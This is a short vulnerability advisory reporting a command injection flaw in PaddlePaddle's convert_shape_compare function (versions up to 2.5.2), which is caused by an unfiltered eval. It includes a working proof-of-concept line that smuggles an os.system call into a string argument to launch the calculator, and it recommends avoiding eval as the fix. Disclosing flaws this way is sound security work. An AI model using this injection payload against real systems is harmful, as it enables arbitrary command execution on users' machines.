
Vulnerability Product: Baidu.Inc PaddlePaddle's paddle  
Vulnerability Version: <= 2.5.2  
Vulnerability Type: Command Execution  
Vulnerability Vender: Baidu.Inc  
Vulnerability Details:  discovered by leeya_bug  
Vulnerability Location: paddle/jit/dy2static/convert_operators.py  

## [](#header-3)Basic Info:

Baidu,Inc is a Chinese multinational technology company specializing in Internet-related services, products, and artificial intelligence(AI), headquartered in Beijing's Haidian District. It is one of the largest AI and Internet companies in the world. The holding company of the group is incorporated in the Cayman Island.  

Baidu.Inc PaddlePaddle's Official lib paddle exists Command Execute Vulnerability, Easy to cause user's devices to be hijacked by attackers.

## [](#header-3)PROVE: 

0、Prepare a computer which can run Python3 and Windows10(or other os if you construct a suitable payload)  

1、Download paddle latest version(or <= v2.5.2 if paddle updated)  
```
pip3 install paddlepaddle==2.5.2
```

2、Run Python3, Construct a payload that can run calculator, And run belowing code in python  
```py
import paddle
paddle.jit.dy2static.convert_operators.convert_shape_compare('prefix','+ str(__import__("os").system("calc")) +','1')
```

3、You can find it successfully run calculator  
![图片](https://raw.githubusercontent.com/Leeyangee/leeya_bug/main/AboutThis1.png)  
proved Command Execution  

POC:  
```py
import paddle
paddle.jit.dy2static.convert_operators.convert_shape_compare('prefix','+ str(__import__("os").system("calc")) +','1')
```

## [](#header-3)REASON: 

There is an unfiltered dangerous function (line 681) in API:convert_shape_compare of path paddle/jit/dy2static/convert_operators.py, allowing attackers to construct dangerous code to bypass the filter and result in command execution.  
If the user mistakenly runs dangerous code, the attacker can construct a payload and run a reverse shell to control the user's computer.  
![图片](https://raw.githubusercontent.com/Leeyangee/leeya_bug/main/AboutThis2.png)  

Actually it's also easy for attacker to call the first eval if condition is true.  
![图片](https://raw.githubusercontent.com/Leeyangee/leeya_bug/main/AboutThis3.png)  


## [](#header-3)FIX: 

1、do not use eval or use safe_eval  
2、filter more  

discovered by leeya_bug  
2023/12/15  

-----------
2023/12/16 update: uppercase letter, add basic information.

-----------
2023/12/17 update: another same vulnerability
